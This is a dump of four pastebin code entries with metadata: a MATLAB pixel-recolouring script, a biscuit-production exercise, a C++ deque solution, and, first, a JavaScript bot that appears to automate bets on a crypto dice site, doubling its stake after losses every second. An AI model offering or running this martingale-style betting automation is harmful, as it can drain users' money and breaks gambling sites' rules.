RuFsRsgw,snowybot,coinwalk,JavaScript,Sunday 22nd of October 2023 05:59:06 AM CDT,"var smiley = parseFloat(document.getElementById('pct_balance').value);
var nudie = Number((smiley/240).toFixed(8));
var burp = nudie;
var taget = 1000;
var bolux = (nudie*10);
var poopy = (nudie*6.5);
var sexual = 0;
var splif = (nudie*24)
var jockey = ((burp*1).toFixed(8));
var bolance = smiley;
var cook = (smiley-splif);
var woman = smiley;
 
 
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
bilance = ((document.getElementById('pct_balance').value)-cook);
if ((bolance>(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+(poopy+nudie)))&&(bolance!=sexual)){
    burp = burp*2;
    sexual = parseFloat(bolance);
}
if (((bilance-(burp*4))<=0)&&(bolance<(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance>=woman)){
burp = nudie;
sexual = 0;
cook = ((parseFloat(bolance))-splif);
woman = parseFloat(bolance);
}
if (((bilance-(burp*4))<=0)&&(bolance<(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<woman)){
burp = nudie;
sexual = 0;
woman = parseFloat(bolance);
}
jockey = ((burp*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(jockey);
$('#a_lo').click();
var dog = ((bolance-smiley).toFixed(8));
console.log(""profit"");
console.log(dog);
setTimeout(() => get(), 1000);
}
get();"
1FR0JNb7,Changing some pixel colors in an image,makispaiktis,Python,Sunday 22nd of October 2023 05:25:27 AM CDT,"clear all
close all
clc

% 1. Basics
I = imread(""IMG_01.jpeg"");
I2 = I;     I3 = I;
[rows, cols, channels] = size(I);
pixels = rows * cols;

% 2. Coordinates to be altered
pososto = 0.2;
converted = floor(pososto * pixels);
coords = zeros(converted, 2);
coords(:, 1) = randi([1 rows], converted, 1);
coords(:, 2) = randi([1 cols], converted, 1);

% 3. Convertions
desired = [255, 255, 255];                  % White
for i = 1 : converted
    row = coords(i, 1);
    col = coords(i, 2);
    I2(row, col, :) = desired;
end

for i = 1 : converted
    row = coords(i, 1);
    col = coords(i, 2);
    I3(row, col, :) = randi([0 255], 1, 3);
end


% 4. Plots
figure();
imshowpair(I, I2, ""montage"");
title(num2str(100*pososto) + ""% of pixels changed to "" + mat2str(desired))
figure();
imshowpair(I, I3, ""montage"");
title(num2str(100*pososto) + ""% of pixels changed to random colors"")"
SZdifkxK,01.js,Grossos,JavaScript,Sunday 22nd of October 2023 05:17:31 AM CDT,"function solve(input) {

    let productionByWorker = +input.shift();
    let workers = +input.shift();
    let productionFor30Days = +input.shift();


    let production = 0;
    let difference = 0;

    for (let days = 1; days <= 30; days++) {

        let dayProduction = productionByWorker * workers;
        if (days % 3 == 0) {
            dayProduction *= 0.75;
        }
        production += Math.floor(dayProduction);
    }
    let negative = false;
    if (production < productionFor30Days) {
        negative = true;
        difference = productionFor30Days - production;
    } else {
        difference = production - productionFor30Days;
    }
    console.log(`You have produced ${production} biscuits for the past month.`);

    let neededBiscuits = difference / productionFor30Days * 100;

    negative == true ? console.log(`You produce ${neededBiscuits.toFixed(2)} percent less biscuits.`) : console.log(`You produce ${neededBiscuits.toFixed(2)} percent more biscuits.`);


}"
2FP58N86,2_С,Korotkodul,C++,Sunday 22nd of October 2023 05:05:42 AM CDT,"#include <cmath>
#include <deque>
#include <iostream>
#include <vector>

using std::cin;
using std::cout;
using std::deque;
using std::max;
using std::min;
using std::string;
using std::vector;

int main() {
  std::ios::sync_with_stdio(false);
  std::cin.tie(0);
  std::cout.tie(0);
  deque<int> qa;
  deque<int> qb;
  int qur;
  cin >> qur;
  int cnt1 = 0;
  int cnt2 = 0;
  int num = 0;
  for (int step = 0; step < qur; ++step) {
    char type;
    cin >> type;
    int nmb;
    if (type != '-') {
      cin >> nmb;
    }
    if (type == '+') {
      if (cnt1 == 0) {
        qa.push_back(nmb);
        cnt1++;
        continue;
      }
      if (cnt1 == num) {
        qa.push_back(qb.front());
        qb.pop_front();
        qb.push_back(nmb);
        cnt1++;
      } else {
        num++;
        cnt2++;
        qb.push_back(nmb);
      }
    } else if (type == '*') {
      if (cnt1 == num) {
        qa.push_back(nmb);
        cnt1++;
      } else {
        cnt2++;
        num++;
        qb.push_front(nmb);
      }
    } else {
      int res = qa.front();
      qa.pop_front();
      cout << res << ""\n"";
      if (cnt1 == num + 1) {
        cnt1--;
      } else {
        int go = qb.front();
        qa.push_back(go);
        qb.pop_front();
        num--;
        cnt2--;
      }
    }
  }
}
"
